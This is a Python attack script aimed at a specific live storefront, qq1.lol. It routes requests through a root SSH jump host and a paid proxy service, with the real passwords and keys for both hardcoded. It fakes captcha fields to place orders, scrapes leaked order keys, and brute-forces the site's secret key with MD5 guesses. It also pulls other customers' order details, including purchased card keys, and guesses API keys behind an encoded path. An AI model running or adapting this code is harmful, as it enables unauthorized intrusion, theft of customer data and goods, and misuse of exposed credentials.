#!/usr/bin/env python3
"""qq1 query.js + GET ?mod=query&data= + SYS_KEY from returned skey"""
import hashlib
import json
import re
import shlex
import subprocess
import time
from datetime import datetime
from pathlib import Path
from urllib.parse import quote

BASE = "https://qq1.lol"
OUT = Path("/workspace/results/qq1.lol")
LOG = OUT / "recheck2.log"
HITS = OUT / "recheck_hits.jsonl"
QG_KEY, QG_PWD = "C413ED6D", "344F550A6F8B"
JP_PASS, JP_HOST = "DX4LmrDaPfd9", "42.240.167.114"
JAR = "/tmp/qq1_recheck2.jar"
_px = None


def log(msg):
    line = f"[{datetime.now():%H:%M:%S}] {msg}"
    print(line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")


def hit(kind, detail, body=""):
    with open(HITS, "a") as f:
        f.write(json.dumps({"kind": kind, "detail": detail, "body": (body or "")[:8000]}, ensure_ascii=False) + "\n")
    log(f"*** HIT [{kind}] {detail}: {(body or '')[:300]}")


def ssh(script, timeout=55):
    return subprocess.run(
        ["sshpass", "-p", JP_PASS, "ssh", "-o", "StrictHostKeyChecking=no", f"root@{JP_HOST}", script],
        capture_output=True, text=True, timeout=timeout,
    ).stdout or ""


def proxy(force=False):
    global _px
    if _px and not force:
        return _px
    d = json.loads(ssh(f"curl -s 'https://share.proxy.qg.net/get?key={QG_KEY}&num=1'", 20))
    _px = f"http://{QG_KEY}:{QG_PWD}@{d['data'][0]['server']}"
    log(f"proxy {_px.split('@')[1]}")
    return _px


def curl(url, post=None, mt=28, force_px=False):
    px = proxy(force_px)
    hdr = "-H 'Referer: https://qq1.lol/?mod=query' -H 'X-Requested-With: XMLHttpRequest'"
    pp = f"-X POST -H 'Content-Type: application/x-www-form-urlencoded' -d {shlex.quote(post)}" if post is not None else ""
    script = (
        f"curl -sk --max-time {mt} -x {shlex.quote(px)} -b {JAR} -c {JAR} -A 'Mozilla/5.0' "
        f"{hdr} {pp} -w '\\n__HTTP:%{{http_code}}' {shlex.quote(url)}"
    )
    out = ssh(script, mt + 30)
    if "__HTTP:" not in out:
        return out.strip(), "000"
    body, code = out.rsplit("__HTTP:", 1)
    return body.strip(), code.strip()


def main():
    log("=== RECHECK2 START ===")
    ssh(f"rm -f {JAR}")
    curl(f"{BASE}/")

    # 1) get query.js
    js, code = curl(f"{BASE}/assets/faka/js/query.js?ver=VERSION")
    if len(js) < 100:
        js, code = curl(f"{BASE}/assets/faka/js/query.js", force_px=True)
    log(f"query.js HTTP={code} len={len(js)}")
    (OUT / "recheck_query.js").write_text(js or "")
    if js:
        for pat in ["ajax.php", "act=", "skey", "showOrder", "qq", "data", "type", "order"]:
            if pat in js:
                i = js.find(pat)
                log(f"  around {pat}: {js[max(0,i-60):i+200]}")

    # 2) create order
    buy, _ = curl(f"{BASE}/?mod=buy&cid=4&tid=102")
    if len(buy) < 500:
        buy, _ = curl(f"{BASE}/?mod=buy&cid=4&tid=102", force_px=True)
    csrf = re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"', buy).group(1)
    hs = subprocess.run(
        ["node", "-e", f"var hashsalt={re.search(r'var hashsalt=(.+);', buy).group(1)}; console.log(hashsalt)"],
        capture_output=True, text=True, timeout=8,
    ).stdout.strip()
    marker = f"qfix{int(time.time()) % 100000}"
    pay, _ = curl(
        f"{BASE}/ajax.php?act=pay",
        post=(
            f"tid=102&num=1&inputvalue={marker}&csrf_token={csrf}&hashsalt={hs}"
            "&geetest_challenge=1&geetest_validate=1&geetest_seccode=1|jordan"
        ),
    )
    tn = re.search(r'"trade_no"\s*:\s*"(\d+)"', pay or "")
    tn = tn.group(1) if tn else None
    log(f"order tn={tn} marker={marker}")

    # 3) GET ?mod=query&data= (form method!)
    for data in [marker, tn, "25949", "25948", "buyi", "qqkqq"] if tn else [marker]:
        if not data:
            continue
        html, code = curl(f"{BASE}/?mod=query&data={quote(str(data))}")
        log(f"GET data={data} HTTP={code} len={len(html)}")
        if html and ("showOrder" in html or "skey" in html or "kminfo" in html or "orderItem" in html):
            hit("query_page", str(data), html[:5000])
            # extract skeys
            for m in re.finditer(r"showOrder\(['\"]?(\d+)['\"]?\s*,\s*['\"]([a-f0-9]+)['\"]", html):
                hit("skey_leak", f"id={m.group(1)} skey={m.group(2)}", m.group(0))
                oid, skey = m.group(1), m.group(2)
                # reverse SYS_KEY
                for w in ["qq1", "buyi", "buyiq", "qqkqq", "830603", "faka", "123456", "admin", "888888",
                          "syskey", "qq1.lol", "buyi123", "buyi888", "布衣", "QQKZC", "rainbow", "mckuai"]:
                    if hashlib.md5(f"{oid}{w}{oid}".encode()).hexdigest() == skey:
                        hit("syskey", w, skey)
                        (OUT / "SYS_KEY.txt").write_text(w)
                # try fetch order
                body, _ = curl(f"{BASE}/ajax.php?act=order", post=f"id={oid}&skey={skey}")
                if body and ("kminfo" in body or '"code":0' in body):
                    hit("order_detail", oid, body)
        elif html and "没有" in html:
            log(f"  no results for {data}")
        time.sleep(1.5)

    # 4) ajax query with qq= empty (own session)
    body, code = curl(f"{BASE}/ajax.php?act=query", post="qq=&page=1")
    log(f"ajax empty qq HTTP={code} body={str(body)[:200]}")
    if body and '"code":0' in body:
        hit("own_orders", "empty", body)

    body, code = curl(f"{BASE}/ajax.php?act=query", post=f"qq={marker}&page=1")
    log(f"ajax qq=marker HTTP={code} body={str(body)[:200]}")
    if body and '"code":0' in body:
        hit("query_ajax", marker, body)

    # 5) API tools/orders with key buyi - single shot
    for act, key in [("tools", "buyi"), ("orders", "buyi"), ("tools", "qq1"), ("orders", "qq1"),
                     ("classlist", ""), ("tools", "123456")]:
        body, code = curl(f"{BASE}/%61pi.php?act={act}&key={quote(key)}&limit=3&tid=102")
        log(f"api act={act} key={key!r} HTTP={code} body={str(body)[:160]}")
        if body and "请提供" not in body and "密钥错误" not in body and "No Act" not in body and len(body) > 20:
            hit("api", f"{act}/{key}", body)
        time.sleep(0.8)

    n = sum(1 for _ in open(HITS)) if HITS.exists() else 0
    log(f"=== RECHECK2 DONE hits={n} ===")


if __name__ == "__main__":
    main()
